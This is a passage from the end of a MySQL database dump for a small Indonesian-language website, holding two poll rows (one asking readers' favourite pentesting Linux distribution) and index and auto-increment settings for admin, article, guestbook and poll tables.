(3, 'Distro linux mana yang kalian suka untuk pentesting?', 'BackTrack', 'Kali Linux', 'BackBox', 'KNOPPIX', 0, 0, 0, 0, 'N'),
(4, 'Menurut kalian, bagaimana isi dari situs ini?', 'Sangat bagus', 'Bagus', 'Cukup bagus', 'Kurang bagus', 0, 0, 0, 0, 'Y');

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `tbl_admin`
--
ALTER TABLE `tbl_admin`
  ADD PRIMARY KEY (`uid`);

--
-- Indeks untuk tabel `tbl_artikel`
--
ALTER TABLE `tbl_artikel`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `tbl_bukutamu`
--
ALTER TABLE `tbl_bukutamu`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `tbl_polling`
--
ALTER TABLE `tbl_polling`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `tbl_admin`
--
ALTER TABLE `tbl_admin`
  MODIFY `uid` int(4) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `tbl_artikel`
--
ALTER TABLE `tbl_artikel`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT untuk tabel `tbl_bukutamu`
--
ALTER TABLE `tbl_bukutamu`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT untuk tabel `tbl_polling`
--
ALTER TABLE `tbl_polling`
  MODIFY `id` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
